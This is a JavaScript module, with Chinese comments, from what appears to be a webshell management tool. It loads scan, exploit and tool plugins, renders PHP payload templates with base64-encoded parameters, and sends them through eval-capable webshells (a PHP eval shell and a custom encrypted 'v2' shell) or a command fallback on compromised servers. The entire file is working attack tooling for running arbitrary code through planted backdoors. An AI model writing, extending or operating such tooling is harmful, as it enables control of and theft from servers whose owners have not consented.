// dsh-webshell-mgr 载荷插件体系（声明式，零客户端代码执行）：
//   插件 = 目录 ~/.dsh/webshell-mgr/plugins/<name>/（随包示例在包内 plugins/examples/）
//   plugin.json：{ name, version, type: scan|exploit|tool, langs: ["php"],
//                  protocols: ["cmd-eval","dsh-aes"],          // 可运行通道
//                  params: [{key,label,type:string|select|bool,default,options}],
//                  entry: "payload.php" }                       // 目标侧载荷模板
//   载荷模板内 {{KEY}} 占位符按 params 渲染后，经 eval 能力通道（或加密 v2 e 操作码）执行。
// 会话发现：webshell_plugin_list 工具与 UI 插件页共用本注册表——会话可读插件清单并按需调用。

import { readdirSync, readFileSync, existsSync, statSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { runSnippet, runCommand, canEval } from "./protocol/capabilities.js";

const pkgRoot = dirname(dirname(fileURLToPath(import.meta.url))); // 插件包根

function readManifest(dir, origin) {
	const mfPath = join(dir, "plugin.json");
	if (!existsSync(mfPath)) return null;
	let mf;
	try { mf = JSON.parse(readFileSync(mfPath, "utf8")); } catch { return null; }
	const name = String(mf.name ?? "").trim();
	if (!name || !/^[a-z0-9-]{2,32}$/i.test(name)) return null;
	if (!mf.entry || typeof mf.entry !== "string" || mf.entry.includes("..")) return null;
	const entryPath = join(dir, mf.entry);
	if (!existsSync(entryPath)) return null;
	const params = Array.isArray(mf.params)
		? mf.params
			.filter((p) => p && typeof p.key === "string" && /^[a-zA-Z_]\w*$/.test(p.key))
			.map((p) => ({
				key: p.key,
				label: String(p.label ?? p.key),
				type: ["string", "select", "bool"].includes(p.type) ? p.type : "string",
				default: p.default === undefined ? "" : String(p.default),
				options: Array.isArray(p.options) ? p.options.map(String) : []
			}))
		: [];
	return {
		name,
		version: String(mf.version ?? "1.0.0"),
		type: ["scan", "exploit", "tool"].includes(mf.type) ? mf.type : "tool",
		langs: Array.isArray(mf.langs) && mf.langs.length ? mf.langs.map(String) : ["php"],
		protocols: Array.isArray(mf.protocols) && mf.protocols.length ? mf.protocols.map(String) : null,
		params,
		entry: mf.entry,
		entryPath,
		origin,
		dir
	};
}

function scanDir(root, origin, out) {
	if (!existsSync(root)) return;
	let entries;
	try { entries = readdirSync(root); } catch { return; }
	for (const e of entries) {
		const dir = join(root, e);
		try { if (!statSync(dir).isDirectory()) continue; } catch { continue; }
		const mf = readManifest(dir, origin);
		if (mf) out.push(mf);
	}
}

/** 全量插件清单（用户目录 + 随包示例，同名以用户目录优先）。 */
export function listPlugins(userDir) {
	const all = [];
	scanDir(join(pkgRoot, "plugins", "examples"), "builtin", all);
	scanDir(userDir, "user", all);
	const byName = new Map();
	for (const mf of all) byName.set(mf.name, mf); // 后扫描的 user 目录覆盖同名内置
	return [...byName.values()];
}

export function getPlugin(userDir, name) {
	return listPlugins(userDir).find((p) => p.name === String(name ?? "")) ?? null;
}

/** 校验连接可运行该插件（语言 + 协议 + eval 能力）。 */
export async function checkRunnable(conn, plugin) {
	if (!plugin.langs.includes(conn.shell_lang ?? "php")) {
		return `插件语言（${plugin.langs.join("/")}）与连接语言（${conn.shell_lang ?? "?"}）不符`;
	}
	if (plugin.protocols && !plugin.protocols.includes(conn.protocol)) {
		return `插件限定通道（${plugin.protocols.join("/")}），当前连接为 ${conn.protocol}`;
	}
	if (!(await canEval(conn))) {
		return "当前通道无 eval 能力——仅 PHP eval 马与自研加密马 v2 可运行载荷插件";
	}
	return null;
}

/** 渲染载荷模板。参数两种占位形态：
 *   base64_decode('{{key}}') → 值经 base64 内嵌（任意字符安全，推荐——与片段库同约定）
 *   {{key}}                  → 裸值直换（仅用于 select/bool 等受限词表参数）
 * bool 以 true/false 文本替换；未声明占位符清空防模板残留。 */
export function renderPayload(plugin, params = {}) {
	let tpl = readFileSync(plugin.entryPath, "utf8");
	for (const p of plugin.params) {
		let v = params[p.key] ?? p.default ?? "";
		if (p.type === "bool") v = v === true || v === "true" || v === 1 || v === "1" ? "true" : "false";
		v = String(v);
		const enc = Buffer.from(v, "utf8").toString("base64");
		tpl = tpl.split("base64_decode('{{" + p.key + "}}')").join("base64_decode('" + enc + "')");
		tpl = tpl.split("{{" + p.key + "}}").join(v);
	}
	tpl = tpl.replace(/\{\{[A-Za-z_]\w*\}\}/g, "");
	return tpl;
}

/** eval 通道载荷整形：剥 PHP 开闭标签（eval() 内不允许出现 <?php）。 */
export function normalizeEvalCode(code) {
	return String(code ?? "")
		.replace(/^\s*<\?php\b/i, "")
		.replace(/^\s*<\?=/, "")
		.replace(/^\s*<\?(?!xml)/, "")
		.replace(/\?>\s*$/, "")
		.trim();
}

/** 执行插件：渲染 → eval 通道发送 → 提取标记结果。 */
export async function runPlugin(conn, plugin, params) {
	const blocker = await checkRunnable(conn, plugin);
	if (blocker) throw new Error(blocker);
	const code = normalizeEvalCode(renderPayload(plugin, params));
	const out = await runSnippet(conn, code);
	if (out && typeof out === "object" && !Array.isArray(out) && !("b64buffer" in out) && !("text" in out)) return out;
	if (typeof out?.text === "string") return { output: out.text };
	return out;
}

/** 兜底执行（无 eval 通道时的命令式插件：entry 为命令模板）。 */
export async function runPluginViaCommand(conn, plugin, params) {
	const code = renderPayload(plugin, params);
	return { output: await runCommand(conn, code) };
}
